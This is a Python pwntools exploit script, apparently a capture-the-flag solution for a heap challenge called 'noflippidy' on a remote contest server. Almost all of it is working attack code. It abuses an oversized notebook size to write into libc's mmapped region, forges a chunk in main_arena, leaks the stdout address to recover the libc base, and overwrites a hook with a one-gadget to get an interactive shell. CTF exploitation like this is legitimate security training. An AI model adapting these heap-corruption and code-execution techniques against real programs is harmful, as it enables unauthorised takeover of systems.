#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template flippidy
from pwn import args, remote, process, u64, p64, gdb, ELF, context, log, pause, asm
from pwn import *

HOST, PORT = "noflippidy.hackable.software 1337".split()

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./noflippidy_patched') if not args.FLIP else ELF('./flippidy')
libc = ELF('./libc.so.6')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.REMOTE:
        return remote(HOST, PORT)
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
# tbreak *0x{exe.entry:x}
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)

def menu_choice(choice: bytes, wait: bool = True) -> None:
    if wait:
        io.recvuntil(b"3. Exit\n: ")
    io.sendline(choice)

def add(index: int, content: bytes, wait: bool = True) -> bool:
    menu_choice(b"1", wait=wait)
    io.sendlineafter(b"Index: ", str(index).encode())
    res = io.recv(0x8)
    if b"Invalid" in res:
        log.warning(f"index {index} marked as invalid")
        return False
    io.sendline(content)
    return True

def flip() -> None:
    menu_choice(b"2")

def exit_app() -> None:
    menu_choice(b"3", wait=False)

def init_with_size(size: int = None) -> None:
    notebook_size = 10
    if args.SIZE:
        notebook_size = int(args.SIZE)
    elif size:
        notebook_size =  size

    io.recvuntil(b"will be: ")
    io.sendline(str(notebook_size).encode())

def override_mmaped(offset: int, value: bytes, wait: bool = True):
    add((offset-16)>>3, value, wait=wait)

io = start()

overflow = 0x61000000
fake_size = 0x00

evil_size = overflow + (fake_size >> 3)
init_with_size(evil_size)
menu_str = 0x404020
notebook = 0x404158
freelist=  0x404030
stdout = 0x404120
flip = 0x401653
exit_str = 0x404038

mem_size = 0x8001000
if args.FLIP:
    add(0, b"A"*0x2f)
    io.interactive()
    exit()

log.info(f"__malloc_hook @ {hex(libc.sym['__malloc_hook'])}")
libc.address = mem_size
fake_chunk = b"".join([
    p64(0x00),
    p64(0x41),
    p64(menu_str-0x20)
])
log.info(f"overriding offset: {hex(libc.sym['main_arena']+0x20)}")
override_mmaped(libc.sym["main_arena"]+0x20, fake_chunk)
next_offset = libc.address + 0x61c218
add(1, b"A")
add(0, b"A"*0x10 + p64(stdout)*3+p64(exit_str))

io.recvline()
io.recvline()
leak = u64(io.recvline().strip().ljust(8, b"\x00"))
# revert previous "hack"
libc.address = 0x0
libc.address = leak - libc.sym["_IO_2_1_stdout_"]
log.success(f"Got libc base: {hex(libc.address)}")
io.sendline(b"2")
io.sendline(b"2")
onegadget = libc.address + 0x4f432
override_mmaped(next_offset, b"A"*8 + p64(onegadget), wait=False)

exit_app()

io.interactive()

